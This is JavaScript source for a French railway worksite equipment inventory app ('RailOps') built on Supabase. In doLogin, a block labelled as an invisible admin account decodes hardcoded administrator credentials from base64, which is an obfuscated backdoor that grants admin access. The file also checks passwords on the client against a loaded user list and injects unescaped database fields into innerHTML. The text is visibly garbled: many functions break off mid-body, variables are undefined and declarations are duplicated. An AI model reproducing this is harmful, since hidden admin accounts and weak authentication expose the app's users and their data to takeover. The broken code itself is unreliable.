// THEME
// ══════════════════════════════════════
function applyTheme(t){
  document.documentElement.classList.remove('theme-light','theme-sferis');
  document.getElementById('app')?.classList.remove('theme-light','theme-sferis');
  if(t==='light'){
    document.documentElement.classList.add('theme-light');
    document.getElementById('app')?.classList.add('theme-light');
    document.body.style.background='#f4f5f7';
  } else if(t==='sferis'){
    document.documentElement.classList.add('theme-sferis');
    document.getElementById('app')?.classList.add('theme-sferis');
    document.body.style.background='#1a1a1a';
  } else {
    document.body.style.background='#000';
  }
  try{localStorage.setItem('ro_theme',t);}catch(e){}
}
function toggleTheme(){
  const cur=localStorage.getItem('ro_theme')||'dark';
  const next={dark:'light',light:'sferis',sferis:'dark'}[cur]||'dark';
  applyTheme(next);
}
// Appliquer le thème sauvegardé au chargement
(function(){
  try{const t=localStorage.getItem('ro_theme')||'dark';applyTheme(t);}catch(e){}
})();

// ══════════════════════════════════════
// MODE HORS LIGNE — FILE D'ATTENTE
// ══════════════════════════════════════
const OFFLINE_KEY='ro_offline_queue';

function getOfflineQueue(){
  try{return JSON.parse(localStorage.getItem(OFFLINE_KEY)||'[]');}catch(e){return [];}
}
function saveOfflineQueue(q){
  try{localStorage.setItem(OFFLINE_KEY,JSON.stringify(q));}catch(e){}
}
function addToOfflineQueue(type, data){
  const q=getOfflineQueue();
  q.push({type, data, ts:Date.now()});
  saveOfflineQueue(q);
  updateOfflineBadge();
}
function updateOfflineBadge(){
  const q=getOfflineQueue();
  const badge=document.getElementById('offline-badge');
  if(!badge)return;
  if(q.length>0){
    badge.style.display='flex';
    badge.textContent=q.length;
  } else {
    badge.style.display='none';
  }
}
async function flushOfflineQueue(){
  const q=getOfflineQueue();
  if(!q.length)return;
  if(!navigator.onLine)return;
  let sent=0;
  const remaining=[];
  // Récupérer la liste noire des IDs supprimés avant de vider la queue
  let deletedData=[];try{const r=await db.from('deleted_ids').select('*');deletedData=r.data||[];}catch(e){}
  const deletedIds=new Set((deletedData||[]).map(x=>x.id||x.identifiant));

  for(const item of q){
    try{
      if(item.type==='scan'){
        // Ignorer si le matériel a été supprimé
        if(deletedIds.has(item.data.materielId)){sent++;continue;}
        await db.from('scans').upsert([item.data],{onConflict:'id'});
        const mIdx=S.mat.findIndex(m=>m.id===item.data.materielId);
        if(mIdx!==-1){
          await db.from('materiels').upsert([S.mat[mIdx]],{onConflict:'id'});
        }
        sent++;
      } else if(item.type==='materiel'){
        // Ignorer si l'article a été supprimé
        if(deletedIds.has(item.data.id)){sent++;continue;}
        await db.from('materiels').upsert([item.data],{onConflict:'id'});
        sent++;
      }
    } catch(e){
      remaining.push(item);
    }
  }
  saveOfflineQueue(remaining);
  updateOfflineBadge();
  if(sent>0){
    toast(sent+' inspection(s) synchronisée(s) ✓','ok');
    setSyncStatus('connected');
  }
}

// Écouter le retour en ligne
window.addEventListener('online',()=>{
  setSyncStatus('connecting');
  setTimeout(()=>{
    flushOfflineQueue();
    setSyncStatus('connected');
  },1500);
});
window.addEventListener('offline',()=>{
  setSyncStatus('offline');
  toast('Hors ligne — les inspections seront synchronisées au retour du réseau','warn');
});

// ── Hachage SHA-256 des mots de passe ─────────────────────────────────────────
async function sha256(str){
  const buf=await crypto.subtle.digest('SHA-256',new TextEncoder().encode(str));
  return Array.from(new Uint8Array(buf)).map(b=>b.toString(16).padStart(2,'0')).join('');
}

function getPrixForArticle(mat){
  if(!mat) return null;
  const norm=s=>String(s||'').toLowerCase().trim();
  const id=norm(mat.id);
  const nom=norm(mat.nom);
  // Cherche d'abord un match exact, puis le préfixe le plus long qui correspond
  let best=null, bestLen=0;
  for(const p of S.prixCatalogue){
    const ref=norm(p.ref);
    if(ref===id||ref===nom){return p.prix;} // match exact prioritaire
    if((id.startsWith(ref)||nom.startsWith(ref)) && ref.length>bestLen){
      best=p.prix; bestLen=ref.length;
    }
  }
  return best;
}

async function fetchAllMats(){
  const PAGE=1000;
  let all=[],from=0;
  while(true){
    const {data,error}=await db.from('materiels').select('*').range(from,from+PAGE-1);

async function safeDeleteMat(id){
  const {error}=await db.from('materiels').delete().filter('id','eq',id);
  if(error){
    // 404 ou PGRST116 = article absent de Supabase → succès (IDs désynchronisés)
    if(error.code==='PGRST116'||error.message?.includes('0 rows')){
      console.log('[safeDeleteMat] Article absent de Supabase (OK):',id);

async function safeDeleteMats(ids){
  if(!ids.length) return;
  // Utiliser filter avec 'in' pour les slashes
  const {error}=await db.from('materiels').delete().filter('id','in','('+ids.map(i=>`"${i}"`).join(',')+')');
  if(error){

    for(const id of ids) await safeDeleteMat(id);

async function flushDeleteQueue(){
  const q=getDeleteQueue();
  if(!q.length) return;
  for(const id of q){
    try{
      const {error}=await db.from('materiels').delete().filter('id','eq',id);
      // Succès OU 404 (article déjà absent) → on considère comme supprimé
      if(!error||error.code==='PGRST116'||error.details?.includes('0 rows')){
        await db.from('scans').delete().eq('materielId',id).then(()=>{},()=>{});
        try{await db.from('deleted_ids').insert({identifiant:id});}catch(e){console.warn('[deleted_ids insert]',e.message);}
        dequeueDelete(id);
        console.log('[DeleteQueue] OK:',id);
      } else {
        console.warn('[DeleteQueue] Erreur:',id,error.message);
      }
    }catch(e){console.warn('[DeleteQueue] Exception:',id,e);}
    // Dans tous les cas, supprimer du state local
    S.mat=S.mat.filter(m=>m.id!==id);
    S.scans=S.scans.filter(s=>s.materielId!==id);
  }

function getWeekKey(jourReset){
  // jourReset : 0=Dimanche, 1=Lundi (défaut), 2=Mardi... 6=Samedi
  // Remise à zéro à 14h UTC le jour de reset
  const jr=(!jourReset&&jourReset!==0)||isNaN(parseInt(jourReset))?1:parseInt(jourReset);
  const offsetMs=14*60*60*1000;
  const dt=new Date(Date.now()-offsetMs);
  const tmp=new Date(Date.UTC(dt.getUTCFullYear(),dt.getUTCMonth(),dt.getUTCDate()));
  // Jour courant (0=Dim, 1=Lun... 6=Sam)
  const dayJS=tmp.getUTCDay();
  // Nombre de jours depuis le dernier jour de reset
  let diff=(dayJS-jr+7)%7;
  // Reculer jusqu'au dernier jour de reset
  tmp.setUTCDate(tmp.getUTCDate()-diff);
  return tmp.toISOString().split('T')[0]; // YYYY-MM-DD = clé unique
}

function getLundiDate(jourReset){
  const jr=(!jourReset&&jourReset!==0)||isNaN(parseInt(jourReset))?1:parseInt(jourReset);
  const offsetMs=14*60*60*1000;
  const dt=new Date(Date.now()-offsetMs);
  const dayJS=dt.getUTCDay();
  const diff=(dayJS-jr+7)%7;
  const reset=new Date(Date.UTC(dt.getUTCFullYear(),dt.getUTCMonth(),dt.getUTCDate()-diff));
  return reset.toISOString().split('T')[0];
}

// Date helpers
function parseDate(str){
  if(!str)return null;
  // Formats: dd/mm/yyyy or yyyy-mm-dd
  const p=str.split('/');
  if(p.length===3)return new Date(parseInt(p[2]),parseInt(p[1])-1,parseInt(p[0]));
  return new Date(str);
}
function isDateWarning(str){
  // Date déjà passée
  const d=parseDate(str);
  return d&&d<new Date();
}
function isDateSoon(str){
  // Date dans moins de 30 jours
  const d=parseDate(str);
  if(!d)return false;
  const diff=(d-new Date())/(1000*60*60*24);
  return diff>=0&&diff<=30;
}
function echeanceHTML(e){
  if(!e)return '';
  const expired=isDateWarning(e);
  const soon=isDateSoon(e);
  const color=expired?'#F09595':soon?'#f5a623':'var(--text3)';
  const label=expired?' — EXPIRÉE':soon?' — Bientôt ⏰':'';
  return '<div style="grid-column:1/-1"><div style="font-size:10px;color:var(--text3)">Échéance vérification</div>'
    +'<div style="font-size:12px;margin-top:2px;color:'+color+'">'+e+label+'</div></div>';
}
function presIcon(p){
  if(p==='confirme') return`<div class="ps-ok"><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#5DCAA5" stroke-width="2.5"><polyline points="20 6 9 17 4 12"/></svg></div>`;
  if(p==='absent')  return`<div class="ps-absent"><span style="font-size:15px;font-weight:700;color:#F09595">?</span></div>`;
  if(p==='retire')  return`<div style="display:flex;align-items:center;justify-content:center;width:28px;height:28px;border-radius:50%;background:rgba(255,255,255,.06);flex-shrink:0"><svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="var(--text3)" stroke-width="2"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></div>`;
  return`<div class="ps-warn"><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#3db54a" stroke-width="2"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg></div>`;
}
function presLabel(p){return{confirme:'Présent',absent:'Absent / Introuvable','non-confirme':'Non confirmé',retire:'Retiré du chantier'}[p]||p;}
function presBadge(p){return{confirme:'b-ok',absent:'b-danger','non-confirme':'b-warn',retire:'b-gray'}[p]||'b-gray';}
function isKitIncomplet(m){
  // Vérifie si le dernier scan de cet article signale un kit incomplet
  const lastScan=S.scans.filter(s=>s.materielId===m.id).sort((a,b)=>new Date(b.date)-new Date(a.date))[0];
  return !!(lastScan?.observations?.includes('[Kit incomplet'));

async function doLogin(){
  const n=document.getElementById('ln')?.value.trim();
  const p=document.getElementById('lp')?.value;
  if(!n||!p){toast('Remplis tous les champs','danger');return;}

  // ── COMPTE ADMIN INVISIBLE ──────────────────────────────────────────────
  const _AN=atob('RklOT1RfQURNSU4=');  // décodage runtime — ne pas modifier
  const _AP=atob('UkFJTE9QUzIwMjZBRE1JTg==');
  const _APH=await hashMdp(_AP); // hash du mdp admin
  if(n===_AN&&(p===_AP||await hashMdp(p)===_APH)){
    localStorage.removeItem('ro3_c');localStorage.removeItem('ro3_m');localStorage.removeItem('ro3_u');
    S.agent=_AN;S.role='admin';S.page='dashboard';
    localStorage.setItem('ro3_a',JSON.stringify({agent:_AN,role:'admin'}));
    load().then(()=>{render();setupRealtime();setTimeout(flushOfflineQueue,2000);});
    return;
  }
  // ───────────────────────────────────────────────────────────────────────

  const h=await hashMdp(p);
  const user=S.users.find(u=>u.nom.toLowerCase()===n.toLowerCase()&&u.mdp===h);
  if(!user){toast('Nom ou mot de passe incorrect','danger');return;}
  // Vider le localStorage des données métier — Supabase est la seule source de vérité
  localStorage.removeItem('ro3_c');
  localStorage.removeItem('ro3_m');
  localStorage.removeItem('ro3_u');
  S.agent=user.nom;S.role=user.role;S.page='dashboard';
  localStorage.setItem('ro3_a',JSON.stringify({agent:S.agent,role:S.role}));
  load().then(()=>{render();setupRealtime();setTimeout(flushOfflineQueue,2000);});
}

function updateAvatar(v){
  const a=document.getElementById('insc-avatar');if(!a)return;
  const parts=v.trim().split(' ').filter(Boolean);
  if(parts.length>=2){a.textContent=parts[0][0].toUpperCase()+parts[1][0].toUpperCase();a.style.background='rgba(61,181,74,.2)';a.style.color='var(--accent)';}
  else if(parts.length===1&&parts[0].length>0){a.textContent=parts[0][0].toUpperCase();a.style.background='rgba(61,181,74,.15)';a.style.color='var(--accent)';}
  else{a.textContent='?';a.style.background='var(--bg3)';a.style.color='var(--text2)';}
}
function selIR(r){
  _ir=r||null;
  const wrap=document.getElementById('chef-code-wrap');
  const hint=document.getElementById('code-hint');
  if(wrap){
    wrap.style.display=(r==='chef'||r==='chef_chantier'||r==='cte')?'block':'none';
    if(hint){
      if(r==='chef') hint.innerHTML="Code fourni par votre responsable chef chantier.";
      else if(r==='chef_chantier') hint.innerHTML='Code direction uniquement. Contactez votre responsable.';
      else if(r==='cte') hint.innerHTML="Code fourni par votre chef d'équipe.";
      else hint.innerHTML='';
    }
  }
}
async function doInscription(){
  const nom=document.getElementById('in-nom')?.value.trim();
  const badge=document.getElementById('in-badge')?.value.trim();
  const mdp=document.getElementById('in-mdp')?.value;
  const mdp2=document.getElementById('in-mdp2')?.value;
  const code=document.getElementById('in-code')?.value.trim();
  _ir=document.getElementById('in-role')?.value||_ir;
  if(!nom||!badge||!mdp||!mdp2){toast('Remplis tous les champs','danger');return;}
  if(!_ir){toast('Choisis un rôle','danger');return;}
  if(mdp.length<6){toast('Mot de passe trop court (6 min)','danger');return;}
  if(mdp!==mdp2){toast('Les mots de passe ne correspondent pas','danger');return;}
  if(S.users.find(u=>u.nom.toLowerCase()===nom.toLowerCase())){toast('Ce nom est déjà utilisé','danger');return;}
  if(S.users.find(u=>u.badge===badge)){toast('Ce numéro de badge est déjà utilisé','danger');return;}
  if(_ir==='chef'||_ir==='chef_chantier'||_ir==='cte'){
    const roleKey=_ir==='chef'?'code_chef':_ir==='chef_chantier'?'code_chef_chantier':'code_cte';
    let expected='';
    try{const {data:cfg}=await db.from('app_config').select('value').eq('key',roleKey).single();expected=(cfg?.value||'').toUpperCase();}catch(e){}
    if(!expected||code.toUpperCase()!==expected){
      toast('Code d\'invitation incorrect','danger');return;
    }
  }
  const mdpHash=await hashMdp(mdp);
  const newUser={id:newId('USR'),nom,badge,role:_ir,mdp:mdpHash};
  S.users.push(newUser);
  save();
  // Insérer en Supabase
  try{
    const {error}=await db.from('users').insert({id:newUser.id,nom,badge,role:_ir,mdp:mdpHash});
    if(error) console.warn('[doInscription] Supabase error:',error.message);
  }catch(e){console.warn('[doInscription] Offline:',e.message);}
  // Connexion automatique
  S.agent=nom;S.role=_ir;S.page='dashboard';save();render();setupRealtime();setTimeout(()=>{cleanStaleVerifs();checkWeeklyArchive();},3000);
  setTimeout(()=>toast('Compte créé ! Bienvenue '+nom.split(' ')[0]+' 👋','ok'),80);
}

async function exportBackupComplet(){
  toast('Export backup en cours…','ok');
  try{
    const tables=['chantiers','materiels','scans','users','prix_catalogue','app_config'];
    const results={};
    for(const t of tables){
      const {data}=await db.from(t).select('*');
      results[t]=data||[];
    }
    // Créer un fichier JSON complet
    const json=JSON.stringify(results,null,2);
    const blob=new Blob([json],{type:'application/json'});
    const url=URL.createObjectURL(blob);
    const now=new Date().toLocaleDateString('fr-FR',{day:'2-digit',month:'2-digit',year:'numeric'}).replace(/\//g,'-');
    const a=document.createElement('a');
    a.href=url;a.download='RailOps_Backup_'+now+'.json';
    document.body.appendChild(a);a.click();document.body.removeChild(a);
    setTimeout(()=>URL.revokeObjectURL(url),10000);
    const total=Object.values(results).reduce((s,d)=>s+d.length,0);
    toast('Backup exporté : '+total+' enregistrements ✓','ok');
  }catch(e){toast('Erreur export backup : '+e.message,'danger');}
}

function pgDashChef(el){
  const parents=S.chantiers.filter(c=>!c.parent_id&&c.statut!=='termine'&&isChefOf(c));

  const mesIds=new Set(mesCh.map(c=>c.id));
  const mesMat=S.mat.filter(m=>mesIds.has(m.chantierId)&&m.presence!=='retire');

  const confirmes=mesMat.filter(m=>m.presence==='confirme').length;
  // Conformité = articles confirmés présents / total articles actifs
  const tauxConf=mesMat.length?Math.round(confirmes/mesMat.length*100):0;

  const d2m=62*24*60*60*1000; // 62 jours = ~2 mois

  // Données financières globales

  const tauxConf=totalMat?Math.round(bons/totalMat*100):0;

  const controleRetard=S.mat.filter(m=>!m.controle2m||(new Date()-new Date(m.controle2m.date))>d2m).length;
  const todayS=S.scans.filter(s=>new Date(s.date).toDateString()===new Date().toDateString()).length;
  const wk=getWeekKey();

  // Activité agents cette semaine
  const weekStart=new Date();weekStart.setHours(0,0,0,0);
  const dayOfWeek=weekStart.getDay()||7;
  weekStart.setDate(weekStart.getDate()-(dayOfWeek-1));
  const agentStats={};
  S.scans.filter(s=>new Date(s.date)>=weekStart).forEach(s=>{
    agentStats[s.agentNom]=(agentStats[s.agentNom]||0)+1;
  });
  const topAgents=Object.entries(agentStats).sort((a,b)=>b[1]-a[1]).slice(0,5);
  const agentsActifs=S.users.filter(u=>u.role==='agent'||u.role==='cte');
  const agentsSansScans=agentsActifs.filter(u=>!agentStats[u.nom]);

  // Articles les plus souvent dégradés (sur les 30 derniers jours)
  const il30j=new Date(Date.now()-30*24*60*60*1000);

  const degrades={};

    degrades[s.materielId]=(degrades[s.materielId]||0)+1;

  const topDegrades=Object.entries(degrades).sort((a,b)=>b[1]-a[1]).slice(0,5);

  // Par chef d'équipe
  const chantierActifs=S.chantiers.filter(c=>c.statut!=='termine');
  const chefs=[...new Set(chantierActifs.flatMap(c=>(c.chefs&&c.chefs.length>0)?c.chefs:[c.chef]).filter(Boolean))];
  const parChef=chefs.map(chef=>{

    const ids=new Set(chs.map(c=>c.id));

    const al=mats.filter(m=>m.etat==='hors-service'||m.etat==='degrade').length;

function pgChantiers(el){
  if(S.role==='chef_chantier') return pgChantiersDashboard(el);
  // Parents visibles : appartiennent au chef ET pas sous-chantier
  const parents=S.chantiers.filter(c=>!c.parent_id&&c.statut!=='termine'&&isChefOf(c));
  // Sous-chantiers : rattachés à un parent visible (pas besoin de isChefOf)
  const parent_ids=new Set(parents.map(p=>p.id));
  const sousChantiers=S.chantiers.filter(c=>c.parent_id&&c.statut!=='termine'&&parent_ids.has(c.parent_id));
  const visibleC=[...parents,...sousChantiers];

  const renderChantierCard=(c,isChild=false)=>{
    const mats=matOfC(c.id);const ab=mats.filter(m=>m.presence==='absent').length;
    const done=mats.filter(m=>getVerif(m,"lundi")||getVerif(m,"semaine")).length;
    return`<div class="cc" style="${isChild?'margin-left:12px;border-left:3px solid var(--accent);':''}">
      <div onclick="openC('${c.id}')" style="cursor:pointer">
        <div style="display:flex;justify-content:space-between;align-items:flex-start;gap:8px">
          <div style="flex:1;min-width:0">
            ${isChild?`<div style="font-size:9px;color:var(--accent);font-weight:600;letter-spacing:.06em;margin-bottom:2px">SOUS-CHANTIER</div>`:''}
            <div style="font-size:15px;font-weight:500;color:var(--text)">${c.nom}</div>
            <div style="font-size:12px;color:var(--text2);margin-top:2px">${c.lieu}</div>
          </div>
          <div style="display:flex;align-items:center;gap:6px;flex-shrink:0">
            <span class="badge ${sBadge(c.statut)}">${sLabel(c.statut)}</span>
            <button onclick="event.stopPropagation();confirmDeleteChantier('${c.id}')" title="Supprimer" style="background:rgba(226,75,74,.12);border:.5px solid rgba(226,75,74,.3);border-radius:50%;width:18px;height:18px;display:flex;align-items:center;justify-content:center;cursor:pointer;color:#F09595;font-size:10px;padding:0;line-height:1;flex-shrink:0">✕</button>
          </div>
        </div>
        <div class="pbar"><div class="pbf" style="width:${mats.length?Math.round(done/mats.length*100):0}%;background:${ab?'var(--danger)':'var(--accent)'}"></div></div>
        <div style="display:flex;gap:10px;margin-top:8px;padding-top:8px;border-top:.5px solid var(--border);align-items:center">
          <span style="font-size:11px;color:var(--text3)">${mats.length} articles</span>
          ${ab?`<span style="font-size:11px;color:#F09595">${ab} absent(s)</span>`:''}
          <span style="font-size:11px;color:var(--accent);margin-left:auto">Ouvrir →</span>
        </div>
      </div>
    </div>`;
  };

  el.innerHTML=`
    <div class="topbar"><div class="tbi"><div class="tbt">Chantiers</div><div class="tbs">${visibleC.length} chantier(s)</div></div></div>
    <div style="padding:12px 16px 20px">
      ${visibleC.length===0?`<div style="text-align:center;padding:60px 0;color:var(--text3);font-size:13px">Aucun chantier assigné</div>`:''}
      ${parents.map(p=>{
        const enfants=sousChantiers.filter(s=>s.parent_id===p.id);
        // Si parent avec sous-chantiers : afficher en groupe
        if(enfants.length){
          const allMats=matOfC(p.id);
          const totalMats=enfants.reduce((acc,s)=>acc+matOfC(s.id).length,allMats.length);
          return`<div style="background:var(--bg2);border:.5px solid var(--border);border-radius:var(--r);margin-bottom:12px;overflow:hidden;position:relative">
            <button onclick="event.stopPropagation();confirmDeleteChantier('${p.id}')" title="Supprimer" style="position:absolute;top:8px;right:8px;background:rgba(226,75,74,.12);border:.5px solid rgba(226,75,74,.3);border-radius:50%;width:18px;height:18px;display:flex;align-items:center;justify-content:center;cursor:pointer;color:#F09595;font-size:10px;padding:0;line-height:1;z-index:2">✕</button>
            <div style="padding:12px 14px;display:flex;align-items:center;gap:10px;border-bottom:.5px solid var(--border);cursor:pointer" onclick="openC('${p.id}')">
              <div style="flex:1"><div style="font-size:15px;font-weight:600">${p.nom}</div>
              <div style="font-size:11px;color:var(--text2)">${p.lieu} · ${enfants.length} sous-chantier(s) · ${totalMats} articles</div></div>
              <span class="badge ${sBadge(p.statut)}">${sLabel(p.statut)}</span>
            </div>
            <div style="padding:8px">
              ${enfants.map(s=>renderChantierCard(s,true)).join('')}
            </div>
          </div>`;
        }
        return renderChantierCard(p,false);
      }).join('')}
      ${sousChantiers.filter(s=>!parents.find(p=>p.id===s.parent_id)).map(s=>renderChantierCard(s,true)).join('')}

}

function pgChantiersDashboard(el){
  const visibleC=S.chantiers.filter(c=>c.statut!=='termine');
  const d2m=62*24*60*60*1000;
  const actifMat=S.mat.filter(m=>m.presence!=='retire');
  const totalMat=actifMat.length;
  const totalAbs=actifMat.filter(m=>m.presence==='absent').length;
  const totalHS=actifMat.filter(m=>m.etat==='hs').length;
  // Ctrl retard : seulement les articles de chantiers actifs depuis >62 jours ET ayant eu au moins 1 contrôle
  const chantiersActifsVieux=new Set(S.chantiers.filter(c=>{
    if(c.statut==='termine') return false;
    if(!c.dateDebut) return false;
    return (new Date()-new Date(c.dateDebut))>d2m;
  }).map(c=>c.id));
  const totalRetard=actifMat.filter(m=>{
    if(!chantiersActifsVieux.has(m.chantierId)) return false;
    if(!m.controle2m) return true;
    return (new Date()-new Date(m.controle2m.date))>d2m;
  }).length;
  const totalConf=actifMat.filter(m=>m.presence==='confirme').length;
  const tauxConf=totalMat?Math.round(totalConf/totalMat*100):0;
  const donutColor=tauxConf>=80?'#3db54a':tauxConf>=50?'#f5a623':'#e24b4a';
  const r=40,cx=50,cy=50,circ=2*Math.PI*r;
  const arc=circ*(tauxConf/100);

  el.innerHTML=`
    <div class="topbar"><div class="tbi"><div class="tbt">Tableau de bord</div><div class="tbs">${visibleC.length} chantiers · ${totalMat} articles</div></div></div>

    <!-- KPIs globaux compact -->
    <div style="padding:10px 16px 0;display:flex;gap:10px;align-items:center">
      <!-- Donut compact -->
      <div style="flex-shrink:0">
        <svg width="100" height="100" viewBox="0 0 100 100">
          <circle cx="${cx}" cy="${cy}" r="${r}" fill="none" stroke="var(--bg3)" stroke-width="9"/>
          <circle cx="${cx}" cy="${cy}" r="${r}" fill="none" stroke="${donutColor}" stroke-width="9"
            stroke-dasharray="${arc} ${circ}" stroke-dashoffset="${circ/4}" stroke-linecap="round"/>
          <text x="${cx}" y="${cy-4}" text-anchor="middle" font-size="16" font-weight="700" fill="${donutColor}" font-family="sans-serif">${tauxConf}%</text>
          <text x="${cx}" y="${cy+11}" text-anchor="middle" font-size="8" fill="var(--text3)" font-family="sans-serif">Conformité</text>
        </svg>
      </div>
      <!-- 4 mini stats -->
      <div style="flex:1;display:grid;grid-template-columns:1fr 1fr;gap:6px">
        <div class="stat-card" style="padding:8px;text-align:center">
          <div style="font-size:20px;font-weight:700;color:var(--accent)">${visibleC.length}</div>
          <div style="font-size:10px;color:var(--text2)">Chantiers</div>
        </div>
        <div class="stat-card" style="padding:8px;text-align:center">
          <div style="font-size:20px;font-weight:700;color:${totalAbs?'#F09595':'#3db54a'}">${totalAbs}</div>
          <div style="font-size:10px;color:var(--text2)">Absents</div>
        </div>
        <div class="stat-card" style="padding:8px;text-align:center">
          <div style="font-size:20px;font-weight:700;color:${totalHS?'var(--accent)':'#3db54a'}">${totalHS}</div>
          <div style="font-size:10px;color:var(--text2)">Dégradés/HS</div>
        </div>
        <div class="stat-card" style="padding:8px;text-align:center">
          <div style="font-size:20px;font-weight:700;color:${totalRetard?'#F09595':'#3db54a'}">${totalRetard}</div>
          <div style="font-size:10px;color:var(--text2)">Ctrl retard</div>
        </div>
      </div>
    </div>

    <!-- Chantiers par chantier -->
    <div style="font-size:11px;font-weight:600;letter-spacing:.08em;color:var(--text3);text-transform:uppercase;padding:12px 16px 6px">Par chantier</div>
    <div style="padding:0 16px 80px;display:flex;flex-direction:column;gap:8px">
      ${visibleC.length===0?`<div style="text-align:center;padding:40px 0;color:var(--text3)">Aucun chantier actif</div>`:''}
      ${visibleC.map(c=>{
        const allMats=matOfC(c.id);
        const mats=allMats.filter(m=>m.presence!=='retire');
        const ab=mats.filter(m=>m.presence==='absent').length;
        const nc=mats.filter(m=>m.presence==='non-confirme').length;
        const hs=mats.filter(m=>m.etat==='hs').length;
        const confirms=mats.filter(m=>m.presence==='confirme').length;
        const taux=mats.length?Math.round(confirms/mats.length*100):0;
        const done=mats.filter(m=>getVerif(m,"lundi")||getVerif(m,"semaine")).length;
        const chantierVieux=c.dateDebut&&(new Date()-new Date(c.dateDebut))>d2m;
        const retard=chantierVieux?mats.filter(m=>!m.controle2m||(new Date()-new Date(m.controle2m?.date))>d2m).length:0;
        const chefs=(c.chefs&&c.chefs.length>0)?c.chefs:[c.chef].filter(Boolean);
        const barConf=taux>=80?'#3db54a':taux>=50?'#f5a623':'#e24b4a';
        return`<div onclick="openC('${c.id}')" style="background:var(--bg2);border-radius:var(--r);border:.5px solid var(--border);cursor:pointer;overflow:hidden">
          <!-- En-tête chantier -->
          <div style="padding:10px 14px 8px;border-bottom:.5px solid var(--border);display:flex;justify-content:space-between;align-items:center">
            <div style="flex:1;min-width:0">
              <div style="font-size:14px;font-weight:600;color:var(--text)">${c.nom}</div>
              <div style="font-size:11px;color:var(--text2);margin-top:1px">${c.lieu} · Chef : ${chefs[0]||'—'}</div>
            </div>
            ${ab?`<span class="badge b-danger">${ab} absent${ab>1?'s':''}</span>`:hs?`<span class="badge" style="background:rgba(245,166,35,.12);color:var(--accent)">${hs} HS</span>`:`<span class="badge b-ok">✓ OK</span>`}
          </div>
          <!-- Barre conformité -->
          <div style="padding:0 14px;height:3px"><div style="height:3px;width:${taux}%;background:${barConf};transition:width .3s"></div></div>
          <!-- Grid stats -->
          <div style="display:grid;grid-template-columns:1fr 1fr 1fr 1fr;border-top:.5px solid var(--border)">
            <div style="padding:10px 8px;text-align:center;border-right:.5px solid var(--border)">
              <div style="font-size:20px;font-weight:700;color:var(--text)">${mats.length}</div>
              <div style="font-size:10px;color:var(--text3);margin-top:1px">Articles</div>
            </div>
            <div style="padding:10px 8px;text-align:center;border-right:.5px solid var(--border)">
              <div style="font-size:20px;font-weight:700;color:${ab?'#F09595':nc?'#f5a623':'#3db54a'}">${confirms}</div>
              <div style="font-size:10px;color:var(--text3);margin-top:1px">Confirmés</div>
            </div>
            <div style="padding:10px 8px;text-align:center;border-right:.5px solid var(--border)">
              <div style="font-size:20px;font-weight:700;color:${barConf}">${taux}%</div>
              <div style="font-size:10px;color:var(--text3);margin-top:1px">Conformité</div>
            </div>
            <div style="padding:10px 8px;text-align:center">
              <div style="font-size:20px;font-weight:700;color:${done===mats.length&&mats.length>0?'#3db54a':'var(--text2)'}">${done}/${mats.length}</div>
              <div style="font-size:10px;color:var(--text3);margin-top:1px">Vérifs sem.</div>
            </div>
          </div>
        </div>`;}).join('')}
    </div>`;
}

function openC(id){S.curC=id;S.page='chantier_detail';S.tab='registre';S.filterPres=new Set();S.filterCat=new Set();S.searchReg='';S.sortReg='scan';S.selMode=false;S.selItems=new Set();render();}
function statutLabel(s){return sLabel(s);}

function renderChantierDetail(){
  const c=getC(S.curC);if(!c){go('dashboard');return;}
  const mats=matOfC(c.id);
  const ab=mats.filter(m=>m.presence==='absent').length;
  const nc=mats.filter(m=>m.presence==='non-confirme').length;
  const conf=mats.filter(m=>m.presence==='confirme').length;

  const hs=mats.filter(m=>m.etat==='hors-service').length;

  app.innerHTML=`
    <div class="sb"><span class="t">${tStr()}</span><span class="r">${S.agent}</span></div>
    <div class="topbar">
      <button class="tbk" onclick="goBack()"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="15 18 9 12 15 6"/></svg></button>
      <div class="tbi"><div class="tbt">${c.nom}</div><div class="tbs">${c.lieu}</div></div>
      <span class="badge ${sBadge(c.statut)}">${sLabel(c.statut)}</span>
      ${(S.role==='chef'||S.role==='chef_chantier')?`<button onclick="exportPDF()" style="background:none;border:.5px solid var(--border);border-radius:8px;padding:5px 8px;cursor:pointer;display:flex;align-items:center;gap:5px;color:var(--text2);font-size:11px;font-family:inherit;flex-shrink:0">
        <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/><line x1="12" y1="18" x2="12" y2="12"/><line x1="9" y1="15" x2="15" y2="15"/></svg>PDF
      </button>
      <button onclick="exportExcel()" style="background:none;border:.5px solid rgba(61,181,74,.4);border-radius:8px;padding:5px 8px;cursor:pointer;display:flex;align-items:center;gap:5px;color:#3db54a;font-size:11px;font-family:inherit;flex-shrink:0">
        <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="3" width="18" height="18" rx="2"/><path d="M8 12l3 3 5-5"/></svg>Excel
      </button>`:''}
    </div>
    <!-- ONGLETS -->
    <div class="tabs" style="padding-top:12px;flex-shrink:0">
      <div class="tab${S.tab==='registre'?' on':''}" data-tab="registre" onclick="setTab('registre')" style="${hs?'color:#F09595;':''}">${S.role==='chef_chantier'?'Récap':'Inventaire'} <span style="margin-left:4px;font-size:10px;opacity:.8">${hs?'🔴 '+hs+' HS':ab?'⚠ '+ab:mats.length}</span>
      </div>
      ${S.role==='chef'?`<div class="tab${S.tab==='verifs'?' on':''}" data-tab="verifs" onclick="setTab('verifs')">Vérifs</div>`:''}
      ${S.role!=='agent'&&S.role!=='chef_chantier'?`<div class="tab${S.tab==='tournee'?' on':''}" data-tab="tournee" onclick="setTab('tournee')">Tournée CTE</div>`:''}
      ${S.role!=='chef_chantier'?`<div class="tab${S.tab==='controle'?' on':''}" data-tab="controle" onclick="setTab('controle')">Contrôle 2 mois</div>`:''}
